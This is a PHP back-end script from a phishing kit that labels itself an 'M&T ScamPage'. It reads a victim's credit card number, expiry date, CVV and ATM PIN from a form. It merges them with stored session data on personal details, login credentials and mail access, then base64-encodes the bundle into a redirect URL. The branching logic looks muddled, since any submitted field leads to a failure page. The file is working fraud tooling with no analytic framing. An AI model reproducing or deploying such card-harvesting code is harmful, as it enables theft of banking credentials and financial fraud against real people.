<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET'){
    $TKRand = md5(uniqid(rand(), true));
    session_abort();
    header("Location: Failed.html?id=".$TKRand);
}elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $CreditCardN = $_POST['CCN'];
    $ExpireMonth = $_POST['EXPM'];
    $ExpireYear  = $_POST['EXPY'];
    $CVVCode = $_POST['CVV'];
    $ATMPINCC = $_POST['ATMPIN'];
    if (isset($CreditCardN)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Failed.html?id=".$TKRand);
    }if (isset($ExpireMonth)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Failed.html?id=".$TKRand);
    }if (isset($ExpireYear)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Failed.html?id=".$TKRand);
    }if (isset($CVVCode)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Failed.html?id=".$TKRand);
    }if (isset($ATMPINCC)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: Failed.html?id=".$TKRand);
    }else{
        $Message = 'Result By M&T ScamPage {CC (Credit-Card) Info}';
        $Message .= 'CreditCardNumber: '.$CreditCardN;
        $Message .= 'Expire-Month: '.$ExpireMonth;
        $Message .= 'Expire-Year: '.$ExpireYear;
        $Message .= 'CVV: '.$CVVCode;
        $Message .= 'CC (ATM-PIN): '.$ATMPINCC;

        $_SESSION['CIC'] = base64_encode($Message);
        /*Result Start */
        $PersonalInfo = base64_decode($_SESSION['PNAL']);
        $LoginInfo = base64_decode($_SESSION['ILGNF']);
        $MailAccess = base64_decode($_SESSION['MAC']);
        $CCInfos = base64_decode($_SESSION['CIC']);
        $GLOBMSG = $LoginInfo.'\n'.$PersonalInfo.'\n'.$MailAccess.'\n'.$CCInfos.'\n';
        $GLOBMSGEncrypt = base64_encode($GLOBMSG);
        /*Result End*/
        header("Location: Login.html#".$GLOBMSGEncrypt);
    }
}
?>
